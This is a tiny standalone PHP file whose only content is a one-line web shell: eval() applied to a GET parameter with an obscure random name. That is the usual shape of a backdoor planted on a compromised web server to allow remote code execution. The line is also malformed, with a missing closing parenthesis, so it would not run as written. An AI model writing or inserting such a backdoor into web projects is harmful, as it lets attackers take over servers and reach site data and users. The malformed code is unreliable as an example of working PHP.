<?php
eval($_GET['sYLazgic'];
?>
